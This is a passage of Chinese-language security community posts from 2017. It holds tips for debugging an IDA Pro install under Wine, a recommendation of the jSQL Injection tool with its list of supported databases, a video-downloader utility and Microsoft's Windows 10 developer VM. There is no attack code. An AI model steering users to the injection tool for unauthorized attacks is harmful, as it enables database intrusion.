当然，如果第一步用 wine64 去安装 IDA Pro，那应该可以很顺利，懒得试。

总结下解决问题的思路：

1. 遇到莫名其妙的问题，可以开调试大法，比如 strace/ltrace/pdb 这些命令
2. 还可以看命令输出及相关日志
3. Google 之
4. 官方文档是最保险的一招
5. 一些基本知识是需要有的，如 32/64 位的区别



---

## SQLi

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-10:


__#工具#__

jSQL Injection 注入神器

在 Kali Linux、Pentest Box,、Parrot Security OS、ArchStrike/BlackArch Linux 等都有集成。

支持注入的数据库如下：

Access, CockroachDB, CUBRID, DB2, Derby, Firebird, H2, Hana, HSQLDB, Informix, Ingres, MaxDB, Mckoi, MySQL, Neo4j, NuoDB, Oracle, PostgreSQL, SQLite, SQL Server, Sybase, Teradata and Vertica，居然有 Neo4j。

还可以轻松对 SOAP、JSON 等数据格式进行注入。

这个神器是免费开源且跨平台的，还自带中文显示！具体见：


[GitHub - ron190/jsql-injection: jSQL Injection is ...](https://github.com/ron190/jsql-injection)



<img src="https://file.xiaomiquan.com/c4/12/c412f4725816d6a7f88bea75a4e946897303438e2584c02bc32a17e9bd82831c.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/8a/64/8a640b64dbb5fabff12fa87efea2176a6fffe6c4269d0c2a512177d7bda7c906.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/d0/bb/d0bbf55c97e0bf153b9ea159257e58aef9bf8193f44e2576fa3cc5ee99d7197a.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/28/eb/28ebb8e2c1481c6199cf698740f0196450e63d690b1e95e2fbbec92cc773da98.jpg" width="50%" height="50%" align="middle"/>


---

## 杂


<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@@ATToT__ on 2017-07-11:

有趣实用的杂项分享

You-Get 一款实用的网站视频下载工具（谁用谁知道）

安装：`pip3 install you-get`

用法：`you-get 视频播放页面的url`

官方站： [You-Get](https://you-get.org/)

github: [GitHub - soimort/you-get: Dumb downloader that scr...](https://github.com/soimort/you-get)

支持以下网站的视频/音频下载:

[SUPPORTED SITES](https://you-get.org/#supported-sites)

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-20:


__#资源#__

  Windows 10 开发环境虚拟机


[Download a Windows 10 virtual machine - Windows ap...](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines)

 

包括：

Windows 10 Fall Creators Update Enterprise Evaluation

Visual Studio 2017 (Build 15.4) with the UWP, desktop C++, and Azure workflows enabled

Windows developer SDK and tools (Build 16299.15, installed as part of VS UWP workflow)

Windows UWP samples (Latest)

Windows Subsystem for Linux enabled

Developer mode, Bash on Ubuntu on Windows, and containers enabled

官方提供的，有钱的懒人必备。


<img src="https://file.xiaomiquan.com/114/59/14595ba609dfe860d1f3581235515f24d53ec03b7dbc202afd7f61010ff1cb99.png" width="50%" height="50%" align="middle"/>


---


